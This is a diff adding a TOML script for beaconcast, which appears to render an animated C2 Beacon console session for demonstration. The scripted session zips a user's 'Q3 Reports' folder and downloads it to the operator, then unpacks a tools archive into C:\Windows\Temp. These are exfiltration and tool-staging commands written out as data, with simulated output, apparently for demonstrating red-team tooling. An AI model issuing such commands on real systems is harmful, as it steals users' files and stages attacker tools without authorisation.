@@ -1,0 +1,65 @@
+# zip and unzip in a Beacon console, rendered with beaconcast
+# (github.com/rubyattack3r/beaconcast).
+
+mode = "dark"
+
+[session]
+external = "203.0.113.24"
+internal = "10.10.10.20"
+listener = "https"
+user = "alice"
+computer = "WKS01"
+process = "rundll32.exe"
+pid = 4120
+arch = "x64"
+
+[[command]]
+input = 'zip "C:\Users\alice\Documents\Q3 Reports" q3-reports.zip'
+
+  [[command.event]]
+  at = 0.15
+  kind = "task"
+  text = 'Creating in-memory ZIP download q3-reports.zip from C:\Users\alice\Documents\Q3 Reports'
+
+  [[command.event]]
+  at = 0.9
+  kind = "checkin"
+  bytes = 38951
+
+  [[command.event]]
+  at = 1.6
+  kind = "output"
+  text = "zip: building 'q3-reports.zip' in memory from 'C:\\Users\\alice\\Documents\\Q3 Reports' at level 6"
+
+  [[command.event]]
+  at = 2.1
+  kind = "info"
+  text = "started download of q3-reports.zip (1482113 bytes)"
+
+  [[command.event]]
+  at = 2.9
+  kind = "info"
+  text = "download of q3-reports.zip is complete"
+
+  [[command.event]]
+  at = 3.0
+  kind = "output"
+  text = "zip: queued 'q3-reports.zip' for download (1482113 archive bytes, 42 file(s), 6 directories, 0 link(s) skipped)"
+
+[[command]]
+input = 'unzip C:\Windows\Temp\tools.zip C:\Windows\Temp\tools'
+
+  [[command.event]]
+  at = 0.15
+  kind = "task"
+  text = 'Extracting ZIP archive C:\Windows\Temp\tools.zip into C:\Windows\Temp\tools'
+
+  [[command.event]]
+  at = 0.9
+  kind = "checkin"
+  bytes = 27610
+
+  [[command.event]]
+  at = 1.7
+  kind = "output"
+  text = "unzip: extracted 12 file(s), 3 directories, 4194304 bytes"
